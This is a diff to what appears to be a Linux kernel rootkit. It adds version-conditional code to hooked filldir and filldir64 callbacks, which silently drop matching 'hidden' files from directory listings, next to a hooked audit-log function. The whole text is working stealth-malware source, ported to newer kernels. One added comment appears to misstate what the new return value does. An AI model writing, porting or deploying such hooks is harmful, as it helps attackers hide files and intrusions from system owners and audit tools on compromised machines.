@@ -853,10 +853,17 @@ static struct audit_buffer *m_audit_log_start(struct audit_context *ctx,
 	return real_audit_log_start(ctx, gfp_mask, type);
 }
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
 static bool (*real_filldir)(struct dir_context *, const char *, int, loff_t,
 			    u64, unsigned int);
 static bool m_filldir(struct dir_context *ctx, const char *name, int namlen,
 		      loff_t offset, u64 ino, unsigned int d_type)
+#else
+static int (*real_filldir)(struct dir_context *, const char *, int, loff_t,
+			    u64, unsigned int);
+static int m_filldir(struct dir_context *ctx, const char *name, int namlen,
+		      loff_t offset, u64 ino, unsigned int d_type)
+#endif
 {
 	/** For certain hidden files we don't have inode number initially,
      * when hidden with "hide-file-anywhere" but it is available here
@@ -866,17 +873,36 @@ static bool m_filldir(struct dir_context *ctx, const char *name, int namlen,
      * be updated to the current directory being listed
      */
 	if (fs_search_name(name, ino))
+	/** For kernels v6.1 and later, return 'true' to
+		 * stop iteration instead of '0'.
+		 */
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
+		return true;
+#else
 		return 0;
+#endif
 	return real_filldir(ctx, name, namlen, offset, ino, d_type);
 }
 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
 static bool (*real_filldir64)(struct dir_context *, const char *, int, loff_t,
 			      u64, unsigned int);
 static bool m_filldir64(struct dir_context *ctx, const char *name, int namlen,
 			loff_t offset, u64 ino, unsigned int d_type)
+#else
+static int (*real_filldir64)(struct dir_context *, const char *, int, loff_t,
+			      u64, unsigned int);
+static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,
+			loff_t offset, u64 ino, unsigned int d_type)
+#endif
 {
+
 	if (fs_search_name(name, ino))
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 1, 0)
+		return true;
+#else
 		return 0;
+#endif
 	return real_filldir64(ctx, name, namlen, offset, ino, d_type);
 }
 
